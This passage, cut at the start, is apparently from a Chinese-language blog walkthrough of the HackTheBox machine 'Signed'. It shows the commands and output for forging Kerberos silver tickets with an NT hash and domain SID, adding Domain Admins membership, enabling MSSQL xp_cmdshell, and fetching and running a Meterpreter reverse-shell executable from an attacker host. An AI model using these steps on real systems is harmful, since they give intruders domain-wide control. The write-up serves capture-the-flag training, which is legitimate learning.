class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(readable_sid)\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到 \u003ccode\u003esigned\\it\u003c/code\u003e 的 SID\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  Signed python sid_converter.py \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e105000000000005150000005b7bb0f398aa2245ad4a1ca451040000\nS-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e4088429403\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e1159899800\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2753317549\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e1105\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e那么域 SID 就是\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eS-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e4088429403\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e1159899800\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2753317549\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再计算 MSSQLsvc 用户的 SID\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eS-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e4088429403\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e1159899800\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2753317549\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e1103\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eNTHASH\u003c/h3\u003e\n\u003cp\u003e计算 mssqlsvc 的 NTHASH\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  Signed echo -n \u003cspan class=\"hljs-string\"\u003e'purPLE9795!@'\u003c/span\u003e | iconv -f UTF-\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e -t UTF-16LE | openssl dgst -md4\nMD4(stdin)= ef699384c3285c54128a3ee1ddb1a0cc\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eSilver ticket\u003c/h3\u003e\n\u003cp\u003e伪造一个票据，让你能以任意用户（这里是 User ID \u003ccode\u003e1103\u003c/code\u003e）的身份，并拥有任意权限（这里是 Group \u003ccode\u003e1105\u003c/code\u003e 的成员），去访问 \u003ccode\u003edc01.signed.htb\u003c/code\u003e 主机上的 \u003ccode\u003emssqlsvc\u003c/code\u003e 服务\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  Signed ticketer.py -nthash \u003cspan class=\"hljs-string\"\u003e\"ef699384c3285c54128a3ee1ddb1a0cc\"\u003c/span\u003e -domain-sid \u003cspan class=\"hljs-string\"\u003e\"S-1-5-21-4088429403-1159899800-2753317549\"\u003c/span\u003e -domain \u003cspan class=\"hljs-string\"\u003e\"signed.htb\"\u003c/span\u003e -groups \u003cspan class=\"hljs-string\"\u003e'1105'\u003c/span\u003e -user-\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'1103'\u003c/span\u003e -spn \u003cspan class=\"hljs-string\"\u003e'mssqlsvc/dc01.signed.htb'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'mssqlsvc'\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e pkg_resources\nImpacket v0\u003cspan class=\"hljs-number\"\u003e.12\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e - Copyright Fortra, LLC \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e its affiliated companies \n\n[*] Creating basic skeleton ticket \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e PAC Infos\n[*] Customizing ticket \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e signed.htb/mssqlsvc\n[*]     PAC_LOGON_INFO\n[*]     PAC_CLIENT_INFO_TYPE\n[*]     EncTicketPart\n[*]     EncTGSRepPart\n[*] Signing/Encrypting final ticket\n[*]     PAC_SERVER_CHECKSUM\n[*]     PAC_PRIVSVR_CHECKSUM\n[*]     EncTicketPart\n[*]     EncTGSRepPart\n[*] Saving ticket \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e mssqlsvc.ccache\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  Signed export KRB5CCNAME=mssqlsvc.ccache\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e注意：这里新加坡的 VPN 无法正常执行命令\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  Signed mssqlclient.py -k -no-\u003cspan class=\"hljs-keyword\"\u003epass\u003c/span\u003e dc01.signed.htb -windows-auth                                                                                                                                                                  \n/root/.local/share/pipx/venvs/impacket/lib/python3\u003cspan class=\"hljs-number\"\u003e.13\u003c/span\u003e/site-packages/impacket/version.py:\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e: UserWarning: pkg_resources \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e deprecated \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources packa\nge \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e slated \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e removal \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e early \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e30.\u003c/span\u003e Refrain \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e using this package \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e pin to Setuptools\u0026#x3C;\u003cspan class=\"hljs-number\"\u003e81.\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e pkg_resources                                                                                            \nImpacket v0\u003cspan class=\"hljs-number\"\u003e.12\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e - Copyright Fortra, LLC \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e its affiliated companies \n                                                         \n[*] Encryption required, switching to TLS                                                                                                                                                                                           \n[-] ERROR(DC01): Line \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e: Login failed. The login \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e an untrusted domain \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e cannot be used \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e Integrated authentication.\n➜  Signed mssqlclient.py -k -no-\u003cspan class=\"hljs-keyword\"\u003epass\u003c/span\u003e dc01.signed.htb                                                                                                                                                                                \n/root/.local/share/pipx/venvs/impacket/lib/python3\u003cspan class=\"hljs-number\"\u003e.13\u003c/span\u003e/site-packages/impacket/version.py:\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e: UserWarning: pkg_resources \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e deprecated \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources packa\nge \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e slated \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e removal \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e early \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e30.\u003c/span\u003e Refrain \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e using this package \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e pin to Setuptools\u0026#x3C;\u003cspan class=\"hljs-number\"\u003e81.\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e pkg_resources                                                                                            \nImpacket v0\u003cspan class=\"hljs-number\"\u003e.12\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e - Copyright Fortra, LLC \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e its affiliated companies \n                                                         \n[*] Encryption required, switching to TLS                                                                                                                                                                                           \n[-] ERROR(DC01): Line \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e: Login failed. The login \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e an untrusted domain \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e cannot be used \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e Integrated authentication.   \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e切换到 EU 后正常\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  Signed mssqlclient.py -k -no-\u003cspan class=\"hljs-keyword\"\u003epass\u003c/span\u003e DC01.signed.htb\n  \u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e pkg_resources\nImpacket v0\u003cspan class=\"hljs-number\"\u003e.12\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e - Copyright Fortra, LLC \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e its affiliated companies \n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e, New Value: \u003cspan class=\"hljs-number\"\u003e16192\u003c/span\u003e\n[*] INFO(DC01): Line \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e: Changed database context to \u003cspan class=\"hljs-string\"\u003e'master'\u003c/span\u003e.\n[*] INFO(DC01): Line \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e: Changed language setting to us_english.\n[*] ACK: Result: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e - Microsoft SQL Server (\u003cspan class=\"hljs-number\"\u003e160\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e3232\u003c/span\u003e) \n[!] Press \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e extra shell commands\nSQL (SIGNED\\mssqlsvc  dbo@master)\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eGet Shell\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eSQL (SIGNED\\mssqlsvc  dbo@master)\u003e enable_xp_cmdshell\nINFO(DC01): Line \u003cspan class=\"hljs-number\"\u003e196\u003c/span\u003e: Configuration option \u003cspan class=\"hljs-string\"\u003e'show advanced options'\u003c/span\u003e changed \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e to \u003cspan class=\"hljs-number\"\u003e1.\u003c/span\u003e Run the RECONFIGURE statement to install.\nINFO(DC01): Line \u003cspan class=\"hljs-number\"\u003e196\u003c/span\u003e: Configuration option \u003cspan class=\"hljs-string\"\u003e'xp_cmdshell'\u003c/span\u003e changed \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e to \u003cspan class=\"hljs-number\"\u003e1.\u003c/span\u003e Run the RECONFIGURE statement to install.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eSQL (SIGNED\\mssqlsvc  dbo@master)\u003e xp_cmdshell whoami\noutput            \n---------------   \nsigned\\mssqlsvc   \n\nNULL \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e进行反弹 shell，测试后发现机器中有 \u003ccode\u003ewget\u003c/code\u003e 可以用，这里弹 MSF\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  Signed msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xx.xx.xx.xx LPORT=\u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e -f exe -o rev.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e the payload\n[-] No arch selected, selecting arch: x64 \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e the payload\nNo encoder specified, outputting raw payload\nPayload size: \u003cspan class=\"hljs-number\"\u003e510\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e\nFinal size of exe file: \u003cspan class=\"hljs-number\"\u003e7168\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e\nSaved \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e: rev.exe\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003exp_cmdshell mkdir C:\\Downloads\nxp_cmdshell powershell wget -Uri \u003cspan class=\"hljs-string\"\u003e\"http://xx.xx.xx.xx:8080/rev.exe\"\u003c/span\u003e -OutFile \u003cspan class=\"hljs-string\"\u003e\"C:\\Downloads\\rev.exe\"\u003c/span\u003e\nxp_cmdshell C:\\Downloads\\rev.exe\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Signed/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e读取 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eC:\\Users\\mssqlsvc\\Desktop\u003e\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e user.txt\n\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e user.txt\nxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003cp\u003e和上边差不多，我们需要先找到管理员组的 SID\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eImport-Module ActiveDirectory\n$domainAdmins = Get-ADGroup -Identity \u003cspan class=\"hljs-string\"\u003e\"Domain Admins\"\u003c/span\u003e\n$domainAdmins.SID\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eBinaryLength AccountDomainSid                          Value                                        \n------------ ----------------                          -----                                        \n\u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e S-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e4088429403\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e1159899800\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2753317549\u003c/span\u003e S-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e4088429403\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e1159899800\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2753317549\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e512\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再次生成银票，将管理员组添加上去\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eticketer.py -nthash \u003cspan class=\"hljs-string\"\u003e\"ef699384c3285c54128a3ee1ddb1a0cc\"\u003c/span\u003e -domain-sid \u003cspan class=\"hljs-string\"\u003e\"S-1-5-21-4088429403-1159899800-2753317549\"\u003c/span\u003e -domain \u003cspan class=\"hljs-string\"\u003e\"signed.htb\"\u003c/span\u003e -groups \u003cspan class=\"hljs-string\"\u003e'1105,512'\u003c/span\u003e -user-\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'1103'\u003c/span\u003e -spn \u003cspan class=\"hljs-string\"\u003e'mssqlsvc/dc01.signed.htb'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'mssqlsvc'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e直接读\u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  Signed nxc mssql dc01.signed.htb -u \u003cspan class=\"hljs-string\"\u003e'mssqlsvc'\u003c/span\u003e -k --use-kcache -q \u003cspan class=\"hljs-string\"\u003e\"SELECT BulkColumn FROM OPENROWSET(BULK 'C:\\users\\administrator\\desktop\\root.txt', SINGLE_CLOB) AS a;\"\u003c/span\u003e\nMSSQL       dc01.signed.htb \u003cspan class=\"hljs-number\"\u003e1433\u003c/span\u003e   DC01             [*] Windows \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e / Server \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e Build \u003cspan class=\"hljs-number\"\u003e17763\u003c/span\u003e (name:DC01) (domain:SIGNED.HTB)\nMSSQL       dc01.signed.htb \u003cspan class=\"hljs-number\"\u003e1433\u003c/span\u003e   DC01             [+] SIGNED.HTB\\mssqlsvc \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e ccache (Pwn3d!)\nMSSQL       dc01.signed.htb \u003cspan class=\"hljs-number\"\u003e1433\u003c/span\u003e   DC01             BulkColumn:\u003cspan class=\"hljs-string\"\u003eb'015032292f8626496a1a86ca5a6571c5\\r\\n'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e学习到很多，还是太菜了，在一些地方还是死脑筋，感谢 dalao 们的探路\u003c/p\u003e","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","updated":"2025-10-14","tags":["HackTheBox","Windows","SilverTicket","MSSQL","encrypt"],"categories":"靶机","comments":true,"description":"Season8 - Signed\n\n https://app.hackthebox.com/machines/Signed\n \n\n As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which ca...","isEncrypted":true}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackTheBoxSeason8 - Signed"},"buildId":"PJghSypTuWEFTtl66wJg-","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>